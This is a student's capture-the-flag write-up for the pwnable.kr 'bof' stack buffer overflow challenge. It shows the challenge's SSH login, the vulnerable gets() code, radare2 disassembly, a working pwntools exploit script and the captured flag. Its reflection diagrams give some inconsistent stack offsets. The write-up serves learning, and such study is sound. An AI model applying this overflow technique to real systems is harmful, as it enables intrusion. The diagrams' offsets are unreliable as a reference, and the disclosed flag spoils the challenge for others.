# Server and password
ssh bof@pwnable.kr -p2222 (pw: guest)

# Code
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
# Concept
* Buffer overflow via stack smashing

# Method of Solving
Looking at the code given to me, I see a function that has an argument "int key". It has a local variable named "overflowme", which is a char array of 32 bytes. The program will then get user input through the "gets" function and store it into "overflowme". Afterwards, an if-statement checks whether the key equals "0xcafebabe". If it is, it runs a shellscript; otherwise, it prints "Nah.. ". 

Looking at the main function, it calls the function with the argument "0xdeadbeef".

This looks like a buffer overflow exploit. The vulnerable "gets" function doesn't do length checking, which allows a malicious user to overflow the 32-byte space in "overflowme" and overwrite the value in "key". Intuitively, I know that I need to pass in a payload that is longer than 32 bytes and with 0xcafebabe at the end to overwrite the key. But I do not know how long the payload should be.

I will try to use Radare2 to disassemble the executable file.
```
r2 -d ./bof
aaa
s sym.func
pdf
```
We end up with this:
```
┌ 160: sym.func (int32_t arg_8h);
│ `- args(sp[0x4..0x4]) vars(3:sp[0xc..0x30])
│           0x5657e1fd      55             push ebp
│           0x5657e1fe      89e5           mov ebp, esp
│           0x5657e200      56             push esi
│           0x5657e201      53             push ebx
│           0x5657e202      83ec30         sub esp, 0x30
│           0x5657e205      e8f6feffff     call sym.__x86.get_pc_thunk.bx
│           0x5657e20a      81c3f62d0000   add ebx, 0x2df6
│           0x5657e210      65a114000000   mov eax, dword gs:[0x14]
│           0x5657e216      8945f4         mov dword [var_ch], eax
│           0x5657e219      31c0           xor eax, eax
│           0x5657e21b      83ec0c         sub esp, 0xc
│           0x5657e21e      8d8308e0ffff   lea eax, [ebx - 0x1ff8]
│           0x5657e224      50             push eax
│           0x5657e225      e826feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x5657e22a      83c410         add esp, 0x10
│           0x5657e22d      83ec0c         sub esp, 0xc
│           0x5657e230      8d45d4         lea eax, [var_2ch]
│           0x5657e233      50             push eax
│           0x5657e234      e827feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x5657e239      83c410         add esp, 0x10
│           0x5657e23c      817d08beba..   cmp dword [arg_8h], 0xcafebabe
│       ┌─< 0x5657e243      752d           jne 0x5657e272
│       │   0x5657e245      e836feffff     call sym.imp.getegid
│       │   0x5657e24a      89c6           mov esi, eax
│       │   0x5657e24c      e82ffeffff     call sym.imp.getegid
│       │   0x5657e251      83ec08         sub esp, 8
│       │   0x5657e254      56             push esi
│       │   0x5657e255      50             push eax
│       │   0x5657e256      e855feffff     call sym.imp.setregid
│       │   0x5657e25b      83c410         add esp, 0x10
│       │   0x5657e25e      83ec0c         sub esp, 0xc
│       │   0x5657e261      8d8317e0ffff   lea eax, [ebx - 0x1fe9]
│       │   0x5657e267      50             push eax
│       │   0x5657e268      e833feffff     call sym.imp.system         ; int system(const char *string)
│       │   0x5657e26d      83c410         add esp, 0x10
│      ┌──< 0x5657e270      eb12           jmp 0x5657e284
│      │└─> 0x5657e272      83ec0c         sub esp, 0xc
│      │    0x5657e275      8d831fe0ffff   lea eax, [ebx - 0x1fe1]
│      │    0x5657e27b      50             push eax
│      │    0x5657e27c      e80ffeffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x5657e281      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.func @ 0x5657e270(x)
│      └──> 0x5657e284      90             nop
│           0x5657e285      8b45f4         mov eax, dword [var_ch]
│           0x5657e288      652b051400..   sub eax, dword gs:[0x14]
│       ┌─< 0x5657e28f      7405           je 0x5657e296
│       │   0x5657e291      e84a000000     call sym.__stack_chk_fail_local
│       └─> 0x5657e296      8d65f8         lea esp, [var_8h]
│           0x5657e299      5b             pop ebx
│           0x5657e29a      5e             pop esi
│           0x5657e29b      5d             pop ebp
└           0x5657e29c      c3             ret
```

I look for when the gets function is called. Right before the gets function, we have "lea eax, [var_2ch]". This is the buffer "overflowme" being loaded into the eax register. After the gets function, we have "cmp dword [arg_8h], 0xcafebabe", which checks whether the key value equals 0xcafebabe. 

This tells me that [var_2ch] is overflowme and [arg_8h] is key. Now I need to find out how far they are from each other.
```
afv

arg int32_t arg_8h @ ebp+0x8
var int32_t var_8h @ ebp-0x8
var int32_t var_ch @ ebp-0xc
var int32_t var_2ch @ ebp-0x2c
```
key is 0x8 above ebp, overflowme is 0x2c below ebp.
```
? 0x8 + 0x2c

int32   52
uint32  52
hex     0x34
octal   064
unit    52
segment 0000:0034
string  "4"
fvalue  52.0
float   0.000000000000000f
double  0.000000000000000
binary  0b00110100
base36  0_1g
ternary 0t1221
```
The distance between the start of key to the start of overflowme is 52 bytes. Since the size of key is 4bytes, I now know that the payload has 52 bytes of padding and another 4 bytes for 0xcafebabe!

I then wrote a short Python script using pwntools to connect to the bof server, generate the payload and send it to the server:
```
from pwn import *

p = remote('localhost', 9000)
payload = b'A' * 52
payload += p32(0xcafebabe)

p.sendline(payload)
p.interactive()
```
I then reopened the SSH Bof server with this command:
```
ssh bof@pwnable.kr -p2222 -L 9000:localhost:9000
```
I did this because I faced issues connecting with p = remote('pwnable.kr', 9000). So I used port forwarding.

Afterwards, I entered the shell, typed in "cat flag", and got the flag!

```
Daddy_I_just_pwned_a_buff3r!
```

# Reflection

First time using the buffer overflow exploit that I learnt in my lectures from my course SC3010 Computer Security module, I struggled at first as I thought that the stack looks like this (what was taught in my lectures): 

```
HIGH MEMORY ADDRESS
    +-------------------------+ <--- ebp + 0xC
    |                         |
    |           KEY           |  4bytes
    |                         |
    +-------------------------+ <--- ebp + 0x8
    |                         |
    |   EIP/ return address   |  8bytes
    |                         |
    +-------------------------+ <--- ebp pointer, ebp + 0x0
    |                         |
    |     Saved old ebp       |  8bytes  
    |                         |              
    +-------------------------+
    |                         |
    |      overwriteme        |  8bytes
    |                         |              
    +-------------------------+
    |                         |
    |      overwriteme        |  8bytes
    |                         |
    +-------------------------+
    |                         |
    |      overwriteme        |  8bytes
    |                         |  
    |                         |
    +-------------------------+
    |                         |
    |      overwriteme        |  8bytes
    |                         |  
    |                         |
    +-------------------------+ <--- Our input starts here 
    |                         |
    |   ...                   |
    +-------------------------+
LOW MEMORY ADDRESS
```
Therefore, I thought I needed 48 bytes of padding and 4 bytes for the key. I was wrong. Therefore I need RaDare2 to disassemble the executable to see what the stack really looks like. 
```
HIGH MEMORY ADDRESS
    +-------------------------+ <--- ebp + 0x8
    |                         |
    |           KEY           |  4bytes
    |                         |
    +-------------------------+ <--- ebp + 0x4
    |                         |
    |   EIP/ return address   |  4bytes
    |                         |
    +-------------------------+ <--- ebp pointer, ebp + 0x0
    |                         |
    |     Saved old ebp       |  4bytes  
    |                         |              
    +-------------------------+ <--- ebp - 0x4
    |                         |
    |  Some gap/data, canary? |  8bytes 
    |                         |              
    +-------------------------+ <--- ebp - 0xC
    |                         |
    |      overwriteme        |  8bytes
    |                         |
    +-------------------------+ <--- ebp - 0x14
    |                         |
    |      overwriteme        |  8bytes
    |                         |  
    |                         |
    +-------------------------+ <--- ebp - 0x1C
    |                         |
    |      overwriteme        |  8bytes
    |                         |  
    |                         |
    +-------------------------+ <--- ebp + 0x24
    |                         |  8bytes
    |      overwriteme        |
    +-------------------------+ <--- ebp + 0x2C, our input starts here
LOW MEMORY ADDRESS
```
I learnt how to use RaDare2 to break down the executable and perform reverse engineering to figure out the exact number of bytes for my payload.

I also learnt that this system uses little endian, so the last 4 bytes of the payload should be \xbe\xba\xfe\xca. Therefore in memory, it looks like this:
```
HIGH MEMORY ADDRESS
+--------------------+  ←─ ebp + 0x8
|      [0xCA]        |  
+--------------------+  ←─ ebp + 0x7
|      [0xFE]        |  
+--------------------+  ←─ ebp + 0x6
|      [0xBA]        | 
+--------------------+  ←─ ebp + 0x5
|      [0xBE]        |  
+--------------------+  ←─ ebp + 0x4
LOW MEMORY ADDRESS
```
CPU will read from lower to higher addresses. So BE will be read first, then BA, FE, CA. In little-endian, data is built from right to left, so we end up with 0xcafebabe! (yay, super confusing ngl)

I also learnt that arguments start from the higher address, and variables start from the lower address (buffer written from lower to higher address even though stack is growing in the opposite direction)

Pretty challenging CTF for me, spent about 2 days on this, but very rewarding!

